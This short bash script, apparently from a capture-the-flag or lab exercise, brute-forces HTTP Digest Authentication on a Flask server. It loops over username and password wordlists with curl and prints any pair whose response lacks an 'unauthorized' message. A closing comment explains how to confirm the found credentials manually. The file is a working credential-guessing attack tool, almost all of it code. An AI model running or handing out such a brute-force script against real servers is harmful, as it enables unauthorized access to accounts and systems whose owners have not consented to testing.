#!/bin/bash

# Command: curl -c cookie --digest -u <user>:<pass> <ip_address>
#
# The below is a custom wrapper around this command 
# In the script, we will reply on the fact
# that on using the correct credentials, we will get something else then “Unauthorized Access”.
# The way Flask implements DA (Digest Authentication) relies on a cookie to be sent with the correct credentials.
# As such, save the cookie returned from the server and then brute-force it with the session-cookie passed

while read username; do
  while read password; do
    content=$(curl -s -c cookie --digest -u $username:$password $1)
      if echo "$content" | grep -qi "unauth"; then
        continue
      else
        echo "Found credentials Username: $username and Password: $password"
      fi
  done < $3
done < $2

<< EOF
For authentication purposes, after grabbing the password, we can test this manually with the cookie flag set,
and the credentials spit by the script:


''' curl -c cookie --digest -u user:pass <ip_address> # Note the --digest option here '''

Response:
  Hello, admin!!......
  
 EOF
